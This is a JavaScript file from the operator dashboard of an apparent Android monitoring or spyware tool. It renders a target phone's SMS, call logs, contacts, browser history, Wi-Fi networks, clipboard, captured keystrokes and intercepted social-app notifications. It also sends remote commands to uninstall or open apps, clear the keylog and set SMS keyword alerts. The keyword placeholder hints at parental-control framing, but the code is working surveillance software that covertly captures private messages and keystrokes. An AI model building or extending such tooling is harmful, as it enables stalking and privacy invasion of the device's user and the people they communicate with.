// ==================== DATA TABLES ====================
function renderTable(rows, headers) {
    const pageSize = 20;
    const totalPages = Math.ceil(rows.length / pageSize);
    const start = window.currentPage * pageSize;
    const pageRows = rows.slice(start, start + pageSize);
    let html = '<div style="overflow-x:auto;"><table><thead><tr>';
    headers.forEach(h => html += `<th>${h}</th>`);
    html += '</thead><tbody>';
    pageRows.forEach(r => {
        html += '<tr>';
        r.forEach(cell => html += `<td>${escapeHtml(cell || '')}</td>`);
        html += '</tr>';
    });
    html += '</tbody></table></div>';
    if (totalPages > 1) {
        html += '<div class="pagination">';
        for (let i = 0; i < totalPages; i++) {
            html += `<button class="page-btn" onclick="gotoPage(${i})">${i + 1}</button>`;
        }
        html += '</div>';
    }
    window.panel.innerHTML = html;
}

window.gotoPage = function(p) {
    window.currentPage = p;
    if (window.dataType === 'sms') renderTable(window.currentData, ['Type', 'Number', 'Message', 'Date']);
    else if (window.dataType === 'call') renderTable(window.currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']);
    else if (window.dataType === 'contacts') renderTable(window.currentData, ['Name', 'Number', 'Times Contacted']);
    else if (window.dataType === 'wifi') renderTable(window.currentData, ['SSID', 'Signal', 'Status']);
};

function displaySMS(data) {
    let smsArray = data;
    if (typeof data === 'string') {
        try { smsArray = JSON.parse(data); } catch (e) { smsArray = []; }
    }
    if (!Array.isArray(smsArray) || smsArray.length === 0) {
        window.panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found.</p>';
        return;
    }
    const rows = smsArray.map(m => [
        m.type === 'inbox' || m.type === 1 ? '📥 Incoming' : '📤 Outgoing',
        m.address || m.number || '',
        m.body || '',
        m.date || m.timeFmt || ''
    ]);
    window.currentData = rows;
    window.dataType = 'sms';
    renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
}

function displayCallLogs(data) {
    let callArray = data;
    if (typeof data === 'string') {
        try { callArray = JSON.parse(data); } catch (e) { callArray = []; }
    }
    if (!Array.isArray(callArray) || callArray.length === 0) {
        window.panel.innerHTML = '<h3>📞 Call Logs</h3><p>No call logs found.</p>';
        return;
    }
    const rows = callArray.map(c => [
        c.type || '',
        c.number || '',
        c.name || '',
        c.date || c.timeFmt || '',
        formatDurationSeconds(c.duration)
    ]);
    window.currentData = rows;
    window.dataType = 'call';
    renderTable(rows, ['Type', 'Number', 'Name', 'Date', 'Duration']);
}

function displayContacts(data) {
    let contactArray = data;
    if (typeof data === 'string') {
        try { contactArray = JSON.parse(data); } catch (e) { contactArray = []; }
    }
    if (!Array.isArray(contactArray) || contactArray.length === 0) {
        window.panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>';
        return;
    }
    const rows = contactArray.map(c => [
        c.name || '',
        c.number || '',
        c.timesContacted || 0
    ]);
    window.currentData = rows;
    window.dataType = 'contacts';
    renderTable(rows, ['Name', 'Number', 'Times Contacted']);
}

function displayWifiNetworks(data) {
    if (!Array.isArray(data) || data.length === 0) {
        window.panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>';
        return;
    }
    const rows = data.map(n => {
        const bars = n.rssi > -50 ? '████' : (n.rssi > -70 ? '███░' : (n.rssi > -80 ? '██░░' : '█░░░'));
        const status = n.connected ? '● Connected' : '○';
        return [n.ssid || '(hidden)', bars, status];
    });
    window.currentData = rows;
    window.dataType = 'wifi';
    renderTable(rows, ['SSID', 'Signal', 'Status']);
}

function displayInstalledApps(data) {
    if (!Array.isArray(data) || !data.length) { window.panel.innerHTML = '<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
    window.panel.innerHTML = `<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app => `<tr><td>${escapeHtml(app.appName || '')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName || '')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
    document.querySelectorAll('.open-app').forEach(btn => btn.onclick = () => sendCommand('OPEN_APP', { package: btn.dataset.pkg }));
    document.querySelectorAll('.remove-app').forEach(btn => btn.onclick = () => sendCommand('UNINSTALL_APP', { package: btn.dataset.pkg }));
}

function displayBrowserHistory(data) {
    if (!Array.isArray(data) || !data.length) { window.panel.innerHTML = '<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
    window.panel.innerHTML = `<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item => `<tr><td>${escapeHtml(item.date || item.timeFmt || '')}</td><td>${escapeHtml(item.title || '')}</td><td><a href="${escapeHtml(item.url || '#')}" target="_blank">${escapeHtml(item.url || '')}</a></td></tr>`).join('')}</tbody></table></div>`;
}

function displayKeylog(data) {
    if (!Array.isArray(data) || !data.length) { window.panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
    window.panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e => `<tr><td>${escapeHtml(e.timeFmt || '')}</td><td>${escapeHtml((e.pkg || '').split('.').pop())}</td><td>${escapeHtml(e.text || e.key || '')}</td></tr>`).join('')}</tbody></table></div>`;
    document.getElementById('clearKeylogBtn')?.addEventListener('click', () => sendCommand('CLEAR_KEYLOG'));
}

function displayClipboard(data) {
    const content = data && data.content ? data.content : (data || '');
    window.panel.innerHTML = `<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data && data.type ? data.type : 'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div><p style="margin-top:12px;">Captures copied text from device.</p>`;
}

function displaySocialMessages(data) {
    let msgs = typeof data === 'string' ? JSON.parse(data) : data;
    if (!Array.isArray(msgs) || !msgs.length) { window.panel.innerHTML = '<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p><p><small>Note: Live chat content cannot be captured without root. Only notifications are recorded.</small></p>'; return; }
    window.panel.innerHTML = `<h3>💬 Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">` + msgs.slice().reverse().map(m => `<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app || getAppNameFromPkg(m.pkg) || 'Unknown')}</strong> <small>${m.timeFmt || ''}</small></div><div>${escapeHtml(m.title || '')}</div><div>${escapeHtml(m.text || m.body || '')}</div></div>`).join('') + `</div>`;
}

function showAppEventsPanel() {
    window.panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events from device.</p><div><button data-days="1" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">Today</button><button data-days="3" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">3 Days</button><button data-days="5" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">5 Days</button></div><div id="appEventsList"></div>';
    window.panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) }));
    sendCommand('GET_APP_EVENTS', { days: 5 });
}

function displayAppEvents(data) { window.panel.innerHTML = '<p>Events loaded</p>'; }

function showSmsKeywordsPanel() {
    window.panel.innerHTML = '<h3>🔑 SMS Keyword Alerts</h3><p>Get alerts when incoming SMS contains any of these words.</p><div><input id="kwInput" placeholder="drug, fight, bully" style="width:100%;padding:8px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"><button id="saveKw" style="background:#1976ff;color:white;border:none;padding:8px;border-radius:6px;width:100%;">Save Keywords</button></div><div style="margin-top:12px;"><button id="viewKw" style="background:#4caf50;color:white;border:none;padding:6px 12px;border-radius:6px;">View Current</button><button id="clearKw" style="background:#ff9800;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">Clear All</button><button id="viewAlerts" style="background:#2196f3;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">View Alerts</button></div><div id="kwResult" style="margin-top:12px;"></div>';
    document.getElementById('saveKw').onclick = () => { const raw = document.getElementById('kwInput').value.trim(); if (!raw) return showNotification('Enter at least one keyword'); const kws = raw.split(',').map(k => k.trim()).filter(k => k); sendCommand('SET_SMS_KEYWORDS', { keywords: kws }); };
    document.getElementById('viewKw').onclick = () => sendCommand('GET_SMS_KEYWORDS');
    document.getElementById('clearKw').onclick = () => sendCommand('CLEAR_SMS_KEYWORDS');
    document.getElementById('viewAlerts').onclick = () => sendCommand('GET_SMS_ALERTS', { days: 5 });
}

function displaySmsKeywords(data) { }
function displaySmsAlerts(data) { }
